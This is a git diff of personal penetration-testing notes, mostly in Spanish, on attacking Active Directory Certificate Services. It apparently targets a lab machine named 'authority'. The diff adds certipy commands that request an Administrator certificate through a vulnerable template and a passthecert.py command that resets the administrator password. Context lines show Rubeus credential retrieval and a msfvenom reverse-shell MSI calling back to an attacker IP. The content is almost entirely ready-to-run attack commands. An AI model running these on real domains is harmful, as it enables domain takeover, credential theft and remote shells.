@@ -58,6 +58,8 @@ Cuando se autentique vamos a saber a que usuario podemos impersonar. A partir de
 we are impersonating the user, everything we do before RevertoSelf is done on behalf that user
 #Buscar este comentario en el .ps1 para agregar comandos por debajo de esa la linea que se ejecutaran como el usuario a imperonar
 
+## SeMachineAccountPrivilege
+Ver ADCS con certipy
 
 ----------      ----------      ----------      ----------
 =======
@@ -81,7 +83,8 @@ Permite la coneccion al usuario con usr y pswd sin necesiadad de certificados o 
 Para ver forrmas de coneccion mediante evil-winrm visitar attacking_winrm.txt
 
 ----------      ----------      ----------      ----------
-	### ADCS
+	### ADCS: Certificates
+## Certify.exe
 https://github.com/GhostPack/Certify
 #Para ver como saber si ADCS esta en uso ver attacking_ldap.txt
 upload Certify.exe
@@ -101,6 +104,16 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 #Se realiza request para obtener el TGT como administrator
 .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
 #En el caso de que Rubeus no nos genere una sesion como administrator voy a soliciar la credencial con la flag /getcredentials
+
+##Certipy
+-> Maquina authority
+-> Vuln por priv: SeMachineAccountPrivilege
+certipy req -u "test1$" -p "secret" -ca AUTHORITY-CA -dc-ip 10.10.11.222 -target authority.htb -template CorpVPN -upn Administrator@authority.htb
+#Una vez agregada la computadora mediante impacket, requesteo pfx de la computadora de dominio creada
+certipy cert -pfx administrator.pfx
+#Una vez generado el .pfx con esto gener key y cert
+python3 passthecert.py -action modify_user -dc-ip 10.10.11.222 -crt ../../user_crt -key ../../user_key -domain authority.htb -target administrator -new-pass
+#Cambio password del usr administrator
 
 
 msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi -o rev.msi
